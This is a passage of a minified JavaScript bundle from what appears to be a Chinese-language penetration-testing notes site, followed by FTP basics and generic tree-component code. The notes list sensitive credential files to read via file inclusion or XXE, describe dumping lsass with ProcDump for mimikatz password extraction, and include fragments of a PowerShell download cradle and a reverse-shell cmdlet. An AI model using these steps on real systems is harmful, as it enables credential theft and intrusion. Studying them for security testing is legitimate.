(\u53EF\u80FD\u6E17\u900F\u4E1A\u5185\uFF0C\u6742\u7684\u90A3\u4E00\u90E8\u5206\uFF0C\u786E\u5B9E\u90FD\u662F\u7C7B\u4F3C\u521D\u5B66\u8005\u4E00\u6837\u5C42\u6B21\u7684)"),n.a.createElement("h2",null,"\u6210\u719F\u8005\uFF0C\u5E94\u8BE5\u6574\u7406\u6210\u3010\u53C2\u8003\u8D44\u6599\u3011\u3001\u3010\u77E5\u8BC6\u5316\u4F53\u7CFB\u3011\uFF0C\u8054\u63A5\u5230\u3010\u6761\u76EE\u6700\u540E\u3011\u3002Electron\u672C\u5730"))}))},de=U.a=Fe},"Pv/L":function(nu,U,f){"use strict";f.d(U,"a",function(){return n});var R=f("+kx5"),h=f("Y9hK"),l=f("Qw5x"),j=f("u6e6");function n(u){return Object(R.a)(u)||Object(h.a)(u)||Object(l.a)(u)||Object(j.a)()}},QL8i:function(nu,U,f){"use strict";f.r(U),f.d(U,"\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper",function(){return s}),f.d(U,"\u5E38\u89C1\u9690\u79C1\u6587\u4EF6_\u654F\u611F\u6587\u4EF6_\u91CD\u8981\u914D\u7F6E\u6587\u4EF6_Helper",function(){return m}),f.d(U,"Windows_\u624B\u518C",function(){return k});var R=f("tJVT"),h=f("fWQN"),l=f("q1tI"),j=f.n(l),n=f("/qoP"),u=f("ysNt"),t=u.e.singleATag_blank,s=function o(){Object(h.a)(this,o)};s.\u5FEB\u901F\u5B66\u4E60\u65B9\u6848={Linux\u65B9\u6CD5:`
              \u3010explainshell.com\u3011\uFF0C\u4ECE\u539F\u7406\u89E3\u6790\u3010\u5404\u4E2Ashell\u547D\u4EE4\u3011\u7684\u3010\u9009\u9879\u3011
                  \u4EC5Linux\u53EF\u7528

              \u5728\u7EBF\u67E5\u8BE2\u547D\u4EE4\uFF1A
                  \u3010\u547D\u4EE4\u884C\u3011
                      curl cht.sh
                          \u5F97\u5230\u57FA\u672C\u8BF4\u660E
                      curl cht.sh/<\u5177\u4F53\u547D\u4EE4>
                          \u7ED9\u51FA\u8BE6\u7EC6\u7528\u6CD5\uFF0C\u548Cexample

                  \u3010\u5728\u7EBF\u7F51\u7AD9\u3011
                      https://tldr.ostera.io/<\u547D\u4EE4\u540D\u79F0>
    `,Windows_PowerShell\u65B9\u6CD5:`

              \u6682\u65F6\u6CA1\u6709\u627E\u5230

    `},s.wget={Linux\u65B9\u6CD5:`
                  wget

                  \u547D\u4EE4\uFF1A
                      wget  <url\u5730\u5740>  -outfile  <\u4FDD\u5B58\u8DEF\u5F84>

                  \u5E38\u7528\u9009\u9879
                      \u3010-o\u3011\uFF0C\uFF08--output-file\uFF09
    `,Windows_PowerShell\u65B9\u6CD5:`
                  wget

                  \u8D44\u6599\uFF1A
                      \u5B98\u65B9\u6587\u6863 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2

                  \uFF08\u53C8\u53EB\u505A \u3010Invoke-WebRequest\u3011 \uFF09

                  wget  <url\u5730\u5740>  -outfile  <\u4FDD\u5B58\u8DEF\u5F84>

                  \u5E38\u89C1\u9009\u9879\uFF1A
                      \u3010-outfile\u3011
                          \u6307\u5B9A\u3010\u54CD\u5E94\u6B63\u6587\u3011\u7684\u3010\u8F93\u51FA\u6587\u4EF6\u3011\uFF0C\u7684\u3010\u4FDD\u5B58\u8DEF\u5F84\u3011\u3002

    `},s.whoami={Linux\u65B9\u6CD5:`
                  whoami

    `,Windows_PowerShell\u65B9\u6CD5:`
                  whoami

                  \u65E0\u53C2\u6570\uFF0C\u57FA\u672C\u67E5\u8BE2

                  whoami  /priv
                      \u67E5\u770B\u5F53\u524D\u7528\u6237\uFF0C\u6743\u9650

                      \u5177\u4F53\u53EF\u89C1\u300A\u63D0\u6743_\u5B50\u6A21\u5757\u300B

    `},s.cd={Linux\u65B9\u6CD5:`
                  cd
                      123
    `,Windows_PowerShell\u65B9\u6CD5:`
                  cd
                      cd  <\u76EE\u5F55>

                      cd  <\u76D8\u7B26>:                          \u7ED3\u5C3E\u7684\u3010\u53CD\u659C\u6760\u3011\uFF0C\u5FC5\u987B\u8981\u6709


    `},s.strings={Linux\u65B9\u6CD5:`
                      strings
                          \u67E5\u770B\u3010\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011\u5185\u5BB9

                          \u5E38\u7528\u9009\u9879\uFF1A
                              \u3010-e\u3001-e<\u7F16\u7801\u4EE3\u53F7>\u3011
                                  \u6307\u5B9A\u8981\u67E5\u627E\u7684\u5B57\u7B26\u7684\u3010\u7F16\u7801\u3011\u3002

                                  \u53C2\u8003\u8D44\u6599\uFF1A
                                      \u8FD9\u4E2A\u8BA9\u6211\uFF0C\u4E86\u89E3\u4E86\u590D\u5408\u5F62\u5F0F\uFF1Ahttps://stackoverflow.com/questions/51367491/linux-strings-command-with-el-option-to-a-binary-file-and-how-to-replace-the

                                  \u4E3E\u4F8B\uFF1A
                                      strings  -el  <\u5177\u4F53\u6587\u4EF6>

                                  \u5E38\u89C1\u7F16\u7801\u4EE3\u53F7\uFF1A
                                      \u3010s\u3011\uFF0C\u5355 7 \u4F4D\u5B57\u8282\u5B57\u7B26\uFF08ASCII\u3001ISO 8859 \u7B49\uFF0C\u9ED8\u8BA4\u503C\uFF09
                                      \u3010S\u3011\uFF0C\u5355 8 \u4F4D\u5B57\u8282\u5B57\u7B26\uFF0C
                                      \u3010b\u3011\uFF0C16 \u4F4D\u53CC\u5B57\u8282\u5E8F
                                      \u3010l\u3011\uFF0C16-\u4F4D\u5C0F\u7AEF
                                      \u3010B\u3011\uFF0C32 \u4F4D\u5927\u7AEF
                                      \u3010L\u3011\uFF0C32 \u4F4D\u5C0F\u7AEF\u3002\u7528\u4E8E\u67E5\u627E\u5BBD\u5B57\u7B26\u4E32\u3002
                                      \uFF08\u4F8B\u5982\uFF0C l\u548Cb\u9002\u7528\u4E8E Unicode UTF-16/UCS-2 \u7F16\u7801\uFF09\u3002
    `,Windows_PowerShell\u65B9\u6CD5:`

                  strings           (PowerShell\u4E0B)
                      \u548CLinux\u7684\u547D\u4EE4\u7C7B\u4F3C

                  strings64.exe
                      123
                      cmd /c "strings64.exe -accepteula firefox.exe_191129_211531.dmp > firefox.exe_191129_211531.txt"

    `};var m=function o(){Object(h.a)(this,o)};m.Linux=Promise.all([Promise.resolve().then(f.bind(null,"+/qY"))]).then(function(o){var c=Object(R.a)(o,1),b=c[0];return j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                  \u547D\u4EE4\u75D5\u8FF9
                      .bash_history

                  \u91CD\u8981\u6587\u4EF6
                      \u53EF\u4EE5\u53C2\u8003\uFF0C\u4E0B\u65B9 \u3010Linux\u5E38\u89C1\u6307\u4EE4\u3011
                      \u5E38\u7528\u547D\u4EE4\uFF1A
                          cat  *  |  grep  -i  <\u76EE\u6807\u5173\u952E\u8BCD>*

                      \u6E90\u7801\u6587\u4EF6
                          \u3010.php\u6587\u4EF6\u3011\uFF0C\u5305\u542B\u6E90\u7801\u3001\u914D\u7F6E\u4FE1\u606F\u3001\u8D26\u53F7\u5BC6\u7801\uFF0C\u7B49

                      \u8D26\u53F7\u5BC6\u7801\u6587\u4EF6
                          /etc/passwd
                              \u53EF\u4EE5\u5728\u8FD9\u91CC\uFF0C\u641C\u7D22\u3010\u4E4B\u524D\u6709\u9047\u5230\u7684\u7528\u6237\u540D\u3011
                                  \u5982  \u4E4B\u524D\u627E\u5230\u4E86robert

                          \u3010.htpasswd\u3011
                              \u5728\u3010/var/www\u3011\u4E0B\uFF0C\u53EF\u80FD\u6709\u5BC6\u7801

                              Apache\u76F8\u5173

                      \u56FA\u5B9A\u4F4D\u7F6E\u6587\u4EF6
                          \u7ECF\u5E38\uFF0C\u53EF\u4EE5\u7528\u4E8E\u68C0\u6D4B  \uFF08\u5305\u62EC\u3010\u6587\u4EF6\u5305\u542B\u3011\u3001\u3010\u6587\u4EF6\u8BFB\u53D6\u3011\u7B49\u529F\u80FD\uFF09
                              \u4E0A\u6587\u6240\u8BF4\u7684\u3010/etc/passwd\u3011
                              \u3010/etc/shadow\u3011
                              \u3010/etc/my.cnf\u3011
                              \u3010/etc/hosts\u3011
                              \u3010~/.bash_history\u3011
                              \u3010/root/.bash_history\u3011

                      \u3010\u5185\u5BB9\u8FC7\u6EE4\u3011
                          \u5E26\u3010\u4EE5\u4E0B\u5185\u5BB9\u3011\u7684\u6587\u4EF6\u3002
                              shadow*
                                  \uFF08glob\u901A\u914D\u7B26  *\u53F7\u4E0D\u80FD\u653E\u524D\u9762\uFF09

                      \u7528\u6237\u4E2A\u4EBA\u6587\u4EF6
                          \u3010cd  ~\u3011
                              /\u7528\u6237\u76EE\u5F55/.ssh
                                  \u7ECF\u5E38\uFF0C\u6709\u4E00\u4E9B\u79C1\u94A5\u3001\u516C\u94A5  \u4E4B\u7C7B\u7684

                      \u914D\u7F6E\u6587\u4EF6\uFF08\u53EF\u80FD\u548C\u3010CMS\u3011\u4E4B\u7C7B\u7684\u76F8\u5173\uFF09
                          /etc/apache2/sites-enabled/internal.conf
                              \u3010Apache\u3011\u7684\u5185\u7F51\u670D\u52A1\u5668\uFF0C\u6587\u4EF6


      `,n.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(b.Linux\u5E38\u89C1\u6307\u4EE4_cfg_\u4E8C\u7EA7\u624B\u518C)))}),m.Windows=j.a.createElement(j.a.Fragment,null,`
                  \u547D\u4EE4\u75D5\u8FF9
                      ConsoleHost_history.txt
                          \u4F4D\u4E8E\u3010  C:\\Users\\<\u7528\u6237\u540D>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\  \u3011

                  \u91CD\u8981\u6587\u4EF6

                      \u56FA\u5B9A\u4F4D\u7F6E\u6587\u4EF6
                          \u7ECF\u5E38\uFF0C\u53EF\u4EE5\u7528\u4E8E\u68C0\u6D4B  \uFF08\u5305\u62EC\u3010\u6587\u4EF6\u5305\u542B\u3011\u3001\u3010\u6587\u4EF6\u8BFB\u53D6\u3011\u7B49\u529F\u80FD\uFF09
                              \u3010C:\\windows\\system32\\drivers\\etc\\hosts\u3011
                              \u3010c:\\windows\\win.ini\u3011
                              \u3010c:\\boot.ini\u3011
                              \u3010C:\\Windows\\repair\\sam\u3011
                                  \u5B58\u50A8\u7CFB\u7EDF\u521D\u6B21\u5B89\u88C5\u7684\u5BC6\u7801
                              \u3010C:\\Windows\\my.ini\u3011
                                  Mysql\u914D\u7F6E\u4FE1\u606F


                      \u3010.ssh\u3011\u6587\u4EF6
                          \u53EF\u4EE5\u901A\u8FC7\u3010\u83B7\u53D6\u7528\u6237\u540D\u3011\uFF0C\u7136\u540E\u8FDB\u884C\u62FC\u63A5\uFF0C\u5F97\u5230

                          \u573A\u666F\uFF1A
                              \u7ECF\u5E38\u53EF\u7528\u5728  \u3010XXE\u3011\u3001  \u7B49\u73AF\u8282\u3002

                          \u76EE\u5F55\uFF1A\u3010C:\\users\\<\u7528\u6237\u540D>\\.ssh\\\u3011
                          \u6587\u4EF6\uFF1A
                              \u3010C:\\users\\<\u7528\u6237\u540D>\\.ssh\\id_rsa\u3011

                      \u7528\u6237\u76EE\u5F55
                          \u3010C:\\Users\\<\u7528\u6237\u540D>\\\u3011
                              \u7528\u6237\u540D\uFF0C\u901A\u5E38\u53EF\u4EE5\u662F\uFF1A
                                  Administrator

                              \u5E38\u89C1\u76EE\u5F55\uFF1A
                                  \u3010Desktop\\\u3011

  `);var F={name:"\u3010Windows\u3011_\u624B\u518C",steps:[{name:"\u3010Windows\u3011\u5E38\u89C1\u3010\u6307\u4EE4\u3011",desc:j.a.createElement(j.a.Fragment,null),steps:[{name:"\u3010cmd\u3011 \u7EC8\u7AEF",desc:j.a.createElement(j.a.Fragment,null,"\u57FA\u672C\u7684"),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(j.a.createElement("h1",null,"\u65B9\u4FBF\u7684\u901F\u67E5\u624B\u518C"),s.\u5FEB\u901F\u5B66\u4E60\u65B9\u6848.Windows_PowerShell\u65B9\u6CD5,`

          \u67E5\u770B\u7528\u6237\u4FE1\u606F

              whoami
                `,s.whoami.Windows_PowerShell\u65B9\u6CD5,`

              \u5217\u4E3E\u672C\u673A\u7528\u6237\uFF1A
                  net  user
                      net  user  <\u7528\u6237\u540D>

                      net  user  <\u7528\u6237\u540D>  <\u5BC6\u7801>  /add

              \u5217\u4E3E\u7EC4\uFF1A
                  net  localgroup             \uFF08\u8FD8\u4E0D\u592A\u786E\u5B9A\u8FD9\u4E2A\uFF09
                      net  localgroup  <\u7EC4\u540D>  <\u7528\u6237\u540D>  /add  \uFF08\u8FD8\u4E0D\u592A\u786E\u5B9A\u8FD9\u4E2A\uFF09

          \u67E5\u770B\u7F51\u7EDC

              ip  -a

              ipconfig


              netstat
                  netstat  -ano
                      \u67E5\u8BE2\u3010\u7AEF\u53E3\u60C5\u51B5\u3011

                      netstat  -aon  |  findstr  <\u7AEF\u53E3\u540D>
                          \u67E5\u8BE2\uFF0C\u5E76\u8FC7\u6EE4\u6307\u5B9A\u3010\u7AEF\u53E3\u3011

                  netstat  -tulpn

                  netstat  -alnp

          \u8FDB\u7A0B\u64CD\u4F5C
              taskkill  /F  /pid  <\u8FDB\u7A0BID>
                  \u5F3A\u884C\u5173\u95ED\uFF0C\u67D0\u4E2A\u8FDB\u7A0B

          clear


          \u76EE\u5F55\u3001\u6587\u4EF6

              \u524D\u5F80\u76EE\u5F55
                `,s.cd.Windows_PowerShell\u65B9\u6CD5,`

              \u5217\u4E3E\u6587\u4EF6
                  dir


              \u67E5\u770B\u76EE\u5F55
                  chdir

                  pwd
                      \u53EA\u652F\u6301\u3010PowerShell\u3011\uFF0C\u4E0D\u652F\u6301\u3010cmd\u3011

                  echo "%~dp0"

              \u67E5\u770B\u6587\u4EF6

                  type

              \u67E5\u627E\u6587\u4EF6\u5185\u5BB9

                  findstr

              \u5220\u9664

                  del


                `))},{name:"\u3010PowerShell\u3011 \u7EC8\u7AEF",desc:j.a.createElement(j.a.Fragment,null,"\u529F\u80FD\u6BD4 cmd \u66F4\u591A"),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              \u7279\u6B8A\u60C5\u51B5\uFF0C\u5728\u3010CMD\u3011\u4E2D\uFF1A
                  powershell  -c  <\u5177\u4F53\u547D\u4EE4_\u53EF\u591A\u53E5_\u7528\u5206\u53F7\u5206\u9694>

              \u4ECE\u3010CMD\u3011\u5207\u6362\u4E3A\u3010PowerShell\u3011
                  powershell  (\u5728cmd\u73AF\u5883\u4E0B)

              \u5E38\u89C1\u9009\u9879\uFF1A
                  \u3010-enc\u3001 -encodedcommand\u3001  /  -e\u3001 -en\u3001 \u3011\uFF0C\u524D\u4E24\u8005\u8F83\u5E38\u7528\uFF0C\u540E\u4E24\u8005\u6BD4\u8F83\u5C11\u51FA\u73B0
                      \u548C\u3010Base64\u3011\u7F16\u7801\u6709\u5173\uFF1F

              wget
              `,s.wget.Windows_PowerShell\u65B9\u6CD5,`


              gc  <\u6587\u4EF6\u8DEF\u5F84>
                  \u548C\u67E5\u770B\u6587\u4EF6\uFF0C\u5DEE\u4E0D\u591A


              gci
                  \u67E5\u770B\u5F53\u524D\u76EE\u5F55

              \u751F\u6210base64
                  \u3010echo -n <\u5B57\u7B26\u4E32> | iconv -t UTF-16LE | base64 -w0\u3011

              Get-Process
                  \u67E5\u770B\u6240\u6709\u7684\uFF0C\u8FD0\u884C\u8FDB\u7A0B

                  \u5E38\u89C1\u9009\u9879\uFF1A
                      \u3010-name  <\u8FDB\u7A0B\u540D>\u3011
                          \u67E5\u627E\uFF0C\u6307\u5B9A\u8FDB\u7A0B\u540D

              IEX
                  IEX(new-object net.webclient)

              Invoke-PowerShellTcp
                  123


              \u4E8C\u8FDB\u5236\u76F8\u5173

              `,s.strings.Windows_PowerShell\u65B9\u6CD5,`

              123

              `))}]},{name:"\u5E38\u89C1\u3010\u9690\u79C1\u6587\u4EF6\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          `,m.Windows))},{name:"\u3010SysInternals\u3011\u5DE5\u5177\uFF0C\u3010Procdump\u3011\u7B49",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          SysInternals

              \u5B50\u6A21\u5757\uFF1A

                  Procdump / ProcDump64 / ProcDump64.exe

                      \u4ECB\u7ECD\uFF1A
                          \u4E00\u3001
                              \u5C06 Firefox \u8FDB\u7A0B\u7684\u5185\u5BB9\u8F6C\u50A8\u5230\u5185\u5B58\u4E2D\u3002
                          \u4E8C\u3001
                              \u662F\u5FAE\u8F6F\u5B98\u65B9\u5DE5\u5177\uFF0C\u4E0D\u4F1A\u88AB\u6740\u8F6F\u67E5\u6740\u3002
                              \u5176\u6293\u53D6\u5BC6\u7801\u7684\u539F\u7406\u662F\u83B7\u53D6\u5185\u5B58\u6587\u4EF6 lsass.exe \u8FDB\u7A0B\u4E2D\uFF0C\u5B58\u50A8\u7684\u660E\u6587\u767B\u5F55\u5BC6\u7801\u5E76\u5B58\u50A8\u5230lsass.dmp\u6587\u4EF6\u4E2D\u3002
                                  (\u5B83\u7528\u4E8E\u672C\u5730\u5B89\u5168\u548C\u767B\u9646\u7B56\u7565)
                              \u4E4B\u540E\u6211\u4EEC\u5C31\u53EF\u4EE5\u4F7F\u7528mimikatz\u53BB\u8BFB\u53D6lsass.dmp\u83B7\u53D6\u5230\u660E\u6587\u5BC6\u7801\u3002


                      \u7528\u5904\uFF1A
                          \u5982\u679C\u4E00\u4E2A\u3010\u7528\u6237\u3011\u6B63\u5728\u4F7F\u7528\u3010FireFox\u6D4F\u89C8\u5668\u3011\u767B\u5F55\u540E\u53F0\uFF0C\u6211\u4EEC\u53EF\u4EE5\u76F4\u63A5\uFF0C\u4ECE\u3010\u5185\u5B58\u8F6C\u50A8/memory dump\u3011\uFF0C\u8BFB\u53D6\u5230\u3010\u540E\u53F0\u5BC6\u7801\u3011\u3002

                      ProcDump64  -accepteula
                          \u9996\u6B21\u8FD0\u884C\u65F6\uFF0C\u9700\u63A5\u6536\u534F\u8BAE

                      ProcDump64  -ma  <\u8FDB\u7A0BID>


          `))},{name:"\u3010Windows\u5E94\u7528\u7A0B\u5E8F\u3011\u3001\u3010Windows\u5F00\u53D1\u76F8\u5173\u3011",desc:j.a.createElement(j.a.Fragment,null),steps:[{name:"\u3010Mono\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              Mono
                  \u4ECB\u7ECD\uFF1A
                      \u662F\u3010.NET framework\u3011\u7684\u5F00\u6E90\u5B9E\u73B0\u3002
                      \u7528\u4E8E\u3010.NET / C#\u3011\u76F8\u5173\u7684\u6E90\u7801\u7F16\u8BD1\u3002

                  \u5B89\u88C5\u548C\u4E0B\u8F7D\u6B65\u9AA4\uFF1A
                      \u8D44\u6599\uFF1Ahttps://www.mono-project.com/download/stable/#download-lin-ubuntu
                      \u6B65\u9AA4\uFF1A
                          \u6DFB\u52A0apt\u4ED3\u5E93
                          \u6267\u884C\u5B89\u88C5\uFF1A\u3010sudo apt install mono-devel\u3011

                  mcs  <\u4E00\u4E2Acs\u6587\u4EF6>
                      \u7F16\u8BD1\u3010C#\u3011\u6587\u4EF6\uFF0C\u4EE5\u751F\u6210\u4E00\u4E2A\u3010exe\u3011\u6587\u4EF6
                      \u7ED3\u679C\uFF1A
                          \u751F\u6210\u4E86\u4E00\u4E2A\uFF0C\u53EF\u6267\u884C\u7684exe\u6587\u4EF6

              `))},{name:"\u3010DiE\u3011\uFF0C\u3010Detect It Easy\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              DiE\uFF0C(Detect It Easy)
                  \u53C2\u8003\u8D44\u6599\uFF1A
                      \u5B98\u65B9\u4ED3\u5E93\uFF1Ahttps://github.com/horsicq/Detect-It-Easy

                  \u4ECB\u7ECD\uFF1A
                      \u7528\u4E8E\u786E\u5B9A Windows\u3001Linux \u548C MacOS \u6587\u4EF6\u7C7B\u578B\u7684\u7A0B\u5E8F\u3002


              `))},{name:"\u3010dnSpy\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              dnSpy
                  \u4ECB\u7ECD\uFF1A
                      \u7528\u6765 \u7F16\u8F91\u3001\u8C03\u8BD5 \u3010exe\u53EF\u6267\u884C\u6587\u4EF6\u3011\u3002
                          \u8C03\u8BD5\u5668\u548C .NET \u7A0B\u5E8F\u96C6\u7F16\u8F91\u5668\u3002
                          \u5373\u4F7F\u60A8\u6CA1\u6709\u4EFB\u4F55\u53EF\u7528\u7684\u6E90\u4EE3\u7801\uFF0C\u60A8\u4E5F\u53EF\u4EE5\u4F7F\u7528\u5B83\u6765\u7F16\u8F91\u548C\u8C03\u8BD5\u7A0B\u5E8F\u96C6\u3002

                      \u662F\u4E00\u4E2A\u3010\u53CD\u7F16\u8BD1\u5668\u3011\u3002\u53EF\u7528\u4E8E\u67E5\u770B\u548C\u8C03\u8BD5\u3010\u6C47\u7F16\u7A0B\u5E8F\u3011\u3002
                          1.\u5C06\u3010\u4E8C\u8FDB\u5236\u3011\u6587\u4EF6\u5BFC\u5165\u3002
                          2.\u5C55\u5F00\u3010MainModule\u3011\uFF0C\u67E5\u770B\u3010Main()\u3011\u65B9\u6CD5\u3002

                  \u53C2\u8003\u8D44\u6599\uFF1A
                      https://github.com/dnSpy/dnSpy

              `))}]}]},k=F},SeyV:function(nu,U,f){"use strict";f.r(U),f.d(U,"FTP_\u624B\u518C",function(){return t});var R=f("q1tI"),h=f.n(R),l=f("/qoP"),j=f("ysNt"),n=j.e.singleATag_blank,u={name:"\u3010FTP\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4ECB\u7ECD\uFF1A
              file transfer protocol
              client-server model

              21 for control , 20 for data transfer

          \u5E38\u7528\u5DE5\u5177\uFF1A
              filezilla


          \u76F8\u5173\u5176\u5B83\u670D\u52A1\uFF1A
              sftp

              vsftpd

          \u767B\u5F55\u76F8\u5173\uFF1A
              ftp-anon \u533F\u540D\u767B\u5F55

          `))},{name:"\u57FA\u672C\u547D\u4EE4",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      \u767B\u5F55
          ftp  <IP\u5730\u5740>
              \u7136\u540E\uFF0C\u8F93\u5165\u7528\u6237\u540D\u3001\u5BC6\u7801

          \u533F\u540D\u767B\u5F55\u65F6\uFF0C\u7ECF\u5E38\u4F7F\u7528  anonymous/password

      \u5E38\u89C1\u547D\u4EE4\uFF08\u767B\u5F55\u540E\uFF09
          ls \u5217\u4E3E
          cd \u5207\u6362\u76EE\u5F55

          get   \u5355\u4E2A\u4E0B\u8F7D
          mget  \u591A\u4E2A\u4E0B\u8F7D

          put   \u5355\u4E2A\u4E0A\u4F20
          mput  \u591A\u4E2A\u4E0A\u4F20

          bye   \u65AD\u5F00\u8FDE\u63A5

      \u547D\u4EE4\u5927\u5168
          http://imhuchao.com/323.html

      FTP\u72B6\u6001\u7801
          150  \u5217\u8868\u6765\u4E86
          220  \u7248\u672C\u4FE1\u606F
          230  \u5141\u8BB8\u533F\u540D\u767B\u5F55
          250  \u76EE\u5F55\u66F4\u6539\u6210\u529F
          331  \u8F93\u5165\u5BC6\u7801
          5xx

          `))}]},t=u},VWeJ:function(nu,U,f){nu.exports=f.p+"static/\u67E5\u770B\u53EF\u80FD\u6F0F\u6D1E.b74ae52a.png"},WaYH:function(nu,U,f){"use strict";var R=f("wx14"),h=f("rePB"),l=f("Ff2n"),j=f("VTBJ"),n=f("1OyB"),u=f("vuIU"),t=f("JX7q"),s=f("Ji7U"),m=f("LK+K"),F=f("q1tI"),k=f("TSYQ"),o=f.n(k),c=f("bX4T"),b=f("sboe"),e=function(r){for(var P=r.prefixCls,p=r.level,z=r.isStart,N=r.isEnd,K="".concat(P,"-indent-unit"),S=[],T=0;T<p;T+=1){var H;S.push(F.createElement("span",{key:T,className:o()(K,(H={},Object(h.a)(H,"".concat(K,"-start"),z[T]),Object(h.a)(H,"".concat(K,"-end"),N[T]),H))}))}return F.createElement("span",{"aria-hidden":"true",className:"".concat(P,"-indent")},S)},v=F.memo(e),D=f("815F"),d=["eventKey","className","style","dragOver","dragOverGapTop","dragOverGapBottom","isLeaf","isStart","isEnd","expanded","selected","checked","halfChecked","loading","domRef","active","data","onMouseMove","selectable"],A="open",E="close",C="---",y=function(B){Object(s.a)(P,B);var r=Object(m.a)(P);function P(){var p;Object(n.a)(this,P);for(var z=arguments.length,N=new Array(z),K=0;K<z;K++)N[K]=arguments[K];return p=r.call.apply(r,[this].concat(N)),p.state={dragNodeHighlight:!1},p.selectHandle=void 0,p.onSelectorClick=function(S){var T=p.props.context.onNodeClick;T(S,Object(D.b)(p.props)),p.isSelectable()?p.onSelect(S):p.onCheck(S)},p.onSelectorDoubleClick=function(S){var T=p.props.context.onNodeDoubleClick;T(S,Object(D.b)(p.props))},p.onSelect=function(S){if(!p.isDisabled()){var T=p.props.context.onNodeSelect;S.preventDefault(),T(S,Object(D.b)(p.props))}},p.onCheck=function(S){if(!p.isDisabled()){var T=p.props,H=T.disableCheckbox,q=T.checked,G=p.props.context.onNodeCheck;if(!(!p.isCheckable()||H)){S.preventDefault();var ju=!q;G(S,Object(D.b)(p.props),ju)}}},p.onMouseEnter=function(S){var T=p.props.context.onNodeMouseEnter;T(S,Object(D.b)(p.props))},p.onMouseLeave=function(S){var T=p.props.context.onNodeMouseLeave;T(S,Object(D.b)(p.props))},p.onContextMenu=function(S){var T=p.props.context.onNodeContextMenu;T(S,Object(D.b)(p.props))},p.onDragStart=function(S){var T=p.props.context.onNodeDragStart;S.stopPropagation(),p.setState({dragNodeHighlight:!0}),T(S,Object(t.a)(p));try{S.dataTransfer.setData("text/plain","")}catch(H){}},p.onDragEnter=function(S){var T=p.props.context.onNodeDragEnter;S.preventDefault(),S.stopPropagation(),T(S,Object(t.a)(p))},p.onDragOver=function(S){var T=p.props.context.onNodeDragOver;S.preventDefault(),S.stopPropagation(),T(S,Object(t.a)(p))},p.onDragLeave=function(S){var T=p.props.context.onNodeDragLeave;S.stopPropagation(),T(S,Object(t.a)(p))},p.onDragEnd=function(S){var T=p.props.context.onNodeDragEnd;S.stopPropagation(),p.setState({dragNodeHighlight:!1}),T(S,Object(t.a)(p))},p.onDrop=function(S){var T=p.props.context.onNodeDrop;S.preventDefault(),S.stopPropagation(),p.setState({dragNodeHighlight:!1}),T(S,Object(t.a)(p))},p.onExpand=function(S){var T=p.props,H=T.loading,q=T.context.onNodeExpand;H||q(S,Object(D.b)(p.props))},p.setSelectHandle=function(S){p.selectHandle=S},p.getNodeState=function(){var S=p.props.expanded;return p.isLeaf()?null:S?A:E},p.hasChildren=function(){var S=p.props.eventKey,T=p.props.context.keyEntities,H=T[S]||{},q=H.children;return!!(q||[]).length},p.isLeaf=function(){var S=p.props,T=S.isLeaf,H=S.loaded,q=p.props.context.loadData,G=p.hasChildren();return T===!1?!1:T||!q&&!G||q&&H&&!G},p.isDisabled=function(){var S=p.props.disabled,T=p.props.context.disabled;return!!(T||S)},p.isCheckable=function(){var S=p.props.checkable,T=p.props.context.checkable;return!T||S===!1?!1:T},p.syncLoadData=function(S){var T=S.expanded,H=S.loading,q=S.loaded,G=p.props.context,ju=G.loadData,$=G.onNodeLoad;H||ju&&T&&!p.isLeaf()&&!p.hasChildren()&&!q&&$(Object(D.b)(p.props))},p.isDraggable=function(){var S=p.props,T=S.data,H=S.context.draggable;return!!(H&&(!H.nodeDraggable||H.nodeDraggable(T)))},p.renderDragHandler=function(){var S=p.props.context,T=S.draggable,H=S.prefixCls;return(T==null?void 0:T.icon)?F.createElement("span",{className:"".concat(H,"-draggable-icon")},T.icon):null},p.renderSwitcherIconDom=function(S){var T=p.props.switcherIcon,H=p.props.context.switcherIcon,q=T||H;return typeof q=="function"?q(Object(j.a)(Object(j.a)({},p.props),{},{isLeaf:S})):q},p.renderSwitcher=function(){var S=p.props.expanded,T=p.props.context.prefixCls;if(p.isLeaf()){var 